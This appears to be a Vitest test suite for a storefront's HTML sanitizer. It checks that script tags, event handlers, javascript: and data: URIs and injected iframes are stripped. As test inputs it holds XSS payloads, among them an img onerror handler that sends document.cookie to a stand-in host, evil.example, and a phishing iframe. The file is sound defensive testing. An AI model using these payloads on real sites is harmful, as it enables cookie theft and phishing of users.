/**
 * PCP-134 + PCP-135 — Central HTML sanitizer contract.
 *
 * Blog page (`src/app/blog/[slug]/page.tsx`) and HtmlBlockRenderer
 * (`src/components/storefront/home/section-renderers.tsx`) both render
 * admin-supplied HTML via `dangerouslySetInnerHTML`. Defense-in-depth
 * requires every dangerous pattern to be neutralized here.
 *
 * These tests pin the public contract: when the admin write path is
 * bypassed (legacy posts, importers, direct-SQL writes) the render
 * boundary must still reject active content and dangerous protocols.
 */
import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "@/lib/sanitize-html";

describe("sanitizeHtml — defensive contract", () => {
  it("returns empty string for non-string input", () => {
    // @ts-expect-error — runtime guard
    expect(sanitizeHtml(undefined)).toBe("");
    // @ts-expect-error — runtime guard
    expect(sanitizeHtml(null)).toBe("");
    // @ts-expect-error — runtime guard
    expect(sanitizeHtml(42)).toBe("");
  });

  it("preserves safe formatting tags and attributes", () => {
    const input = '<p class="intro">Hello <strong>world</strong></p>';
    const out = sanitizeHtml(input);
    expect(out).toContain("<p");
    expect(out).toContain('class="intro"');
    expect(out).toContain("<strong>world</strong>");
  });

  describe("active content neutralization", () => {
    const dangerousTags = [
      "script",
      "iframe",
      "object",
      "embed",
      "style",
      "svg",
      "form",
      "input",
      "button",
      "video",
      "audio",
    ];

    for (const tag of dangerousTags) {
      it(`strips <${tag}> tags`, () => {
        const out = sanitizeHtml(`<p>ok</p><${tag}>x</${tag}>`);
        expect(out.toLowerCase()).not.toContain(`<${tag}`);
      });

      it(`strips self-closing <${tag}>`, () => {
        const out = sanitizeHtml(`<p>ok</p><${tag} />`);
        expect(out.toLowerCase()).not.toContain(`<${tag}`);
      });
    }
  });

  describe("event handler neutralization", () => {
    for (const handler of ["onclick", "onerror", "onload", "onmouseover", "onfocus", "onanimationend"]) {
      it(`strips ${handler}= attributes`, () => {
        const out = sanitizeHtml(`<img src="x" ${handler}="alert(1)">`);
        expect(out.toLowerCase()).not.toContain(handler);
        expect(out).not.toContain("alert");
      });
    }

    it("strips event handlers with single quotes", () => {
      const out = sanitizeHtml(`<img src='x' onerror='alert(1)'>`);
      expect(out).not.toContain("onerror");
      expect(out).not.toContain("alert");
    });
  });

  describe("dangerous URI scheme blocking", () => {
    for (const scheme of ["javascript", "vbscript", "file", "mocha", "livescript"]) {
      it(`blocks ${scheme}: URIs in href`, () => {
        const out = sanitizeHtml(`<a href="${scheme}:alert(1)">click</a>`);
        expect(out.toLowerCase()).not.toMatch(new RegExp(`href\\s*=\\s*["']?${scheme}:`));
      });

      it(`blocks ${scheme}: URIs in src`, () => {
        const out = sanitizeHtml(`<img src="${scheme}:x">`);
        expect(out.toLowerCase()).not.toMatch(new RegExp(`src\\s*=\\s*["']?${scheme}:`));
      });
    }

    it("blocks data:text/html URIs", () => {
      const out = sanitizeHtml(
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
      );
      // data:text/html is a known script-execution surface and must be
      // blocked. Defense-in-depth: even if a future refactor weakens the
      // <script> strip, this URL never reaches the DOM.
      expect(out.toLowerCase()).not.toMatch(/href\s*=\s*["']?data:text\/html/);
    });

    it("blocks data:image/svg+xml URIs (SVG can carry active content)", () => {
      const out = sanitizeHtml(
        '<img src="data:image/svg+xml;base64,PHN2Zy8+">',
      );
      // Only raster data URIs (png/jpeg/gif/webp) are allowed.
      expect(out.toLowerCase()).not.toMatch(/src\s*=\s*["']?data:image\/svg/);
    });

    it("blocks javascript: URIs with embedded whitespace (java\\tscript:)", () => {
      // Tab/CR/LF inside the scheme is a classic regex-bypass.
      const out = sanitizeHtml('<a href="java\tscript:alert(1)">x</a>');
      expect(out.toLowerCase()).not.toMatch(/href\s*=\s*["']?javascript:/);
      // Sanity: the tag itself is preserved (text intact).
      expect(out).toContain("x");
    });

    it("blocks javascript: URIs with embedded newline (java\\nscript:)", () => {
      const out = sanitizeHtml('<a href="java\nscript:alert(1)">x</a>');
      expect(out.toLowerCase()).not.toMatch(/href\s*=\s*["']?javascript:/);
    });

    it("blocks javascript: URIs with NUL byte (java\\0script:)", () => {
      const out = sanitizeHtml('<a href="java\x00script:alert(1)">x</a>');
      expect(out.toLowerCase()).not.toMatch(/href\s*=\s*["']?javascript:/);
    });

    it("ALLOWS data:image/png URIs on <img src> (legitimate image data URIs)", () => {
      const png =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
      const out = sanitizeHtml(`<img src="${png}" alt="x">`);
      expect(out).toContain("data:image/png");
    });
  });

  describe("attribute allowlist", () => {
    it("strips unknown attributes (e.g. style, data-x)", () => {
      const out = sanitizeHtml(
        '<p style="background:url(javascript:alert(1))" data-evil="1">x</p>',
      );
      expect(out.toLowerCase()).not.toContain("style=");
      expect(out.toLowerCase()).not.toContain("data-evil");
    });

    it("forces rel=noopener noreferrer on external <a href>", () => {
      const out = sanitizeHtml('<a href="https://example.com/">x</a>');
      expect(out).toContain('rel="noopener noreferrer"');
      expect(out).toContain('target="_blank"');
    });

    it("does not force target=_blank on internal anchors", () => {
      // Internal hrefs (relative or /-prefixed) don't get target=_blank,
      // but still get the safe rel.
      const out = sanitizeHtml('<a href="/some-page">x</a>');
      expect(out).toContain('rel="noopener noreferrer"');
    });
  });

  describe("input length cap", () => {
    it("truncates input exceeding maxLength", () => {
      // The cap applies to the input slice (maxLength); output is bounded
      // by the sanitized slice and must be < the original.
      const big = "<p>" + "a".repeat(1000) + "</p>";
      const out = sanitizeHtml(big, 100);
      // Input was 1004 chars; the cap slices to 100 then sanitizes.
      // The <p> opener is preserved at the start of the slice.
      expect(out.length).toBeLessThanOrEqual(100);
      expect(out).toContain("<p>");
    });
  });

  describe("realistic blog-content payloads (PCP-134)", () => {
    it("preserves Arabic prose + <a href> with safe URL", () => {
      const input =
        '<p>مرحبا بكم في <a href="https://citymarkets.sa/blog">مدونتنا</a></p>';
      const out = sanitizeHtml(input);
      expect(out).toContain("مرحبا بكم");
      expect(out).toContain('href="https://citymarkets.sa/blog"');
      expect(out).toContain('rel="noopener noreferrer"');
    });

    it("neutralizes a stored XSS in legacy post", () => {
      const input =
        "<p>مرحبا</p>" +
        '<img src="x" onerror="document.location=\'https://evil.example/?c=\'+document.cookie">';
      const out = sanitizeHtml(input);
      expect(out.toLowerCase()).not.toContain("onerror");
      expect(out).not.toContain("document.location");
      expect(out).not.toContain("evil.example");
      // Legitimate content preserved.
      expect(out).toContain("مرحبا");
    });

    it("neutralizes SVG-based XSS in legacy post", () => {
      const input = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>';
      const out = sanitizeHtml(input);
      expect(out.toLowerCase()).not.toContain("<svg");
      expect(out).not.toContain("onload");
      expect(out).not.toContain("alert");
    });
  });

  describe("realistic html-block payloads (PCP-135)", () => {
    it("preserves admin marketing HTML", () => {
      const input =
        '<h2>عرض خاص</h2><p>خصم <strong>50%</strong> على جميع المنتجات</p>' +
        '<a href="/offers">تصفح العروض</a>';
      const out = sanitizeHtml(input);
      expect(out).toContain("<h2>عرض خاص</h2>");
      expect(out).toContain("<strong>50%</strong>");
      expect(out).toContain('href="/offers"');
    });

    it("neutralizes a phishing iframe injected via admin layout", () => {
      const input =
        "<p>شكراً لزيارتكم</p>" +
        '<iframe src="https://phish.example/login" width="800" height="600"></iframe>';
      const out = sanitizeHtml(input);
      expect(out.toLowerCase()).not.toContain("<iframe");
      expect(out.toLowerCase()).not.toContain("phish.example");
      expect(out).toContain("شكراً لزيارتكم");
    });
  });
});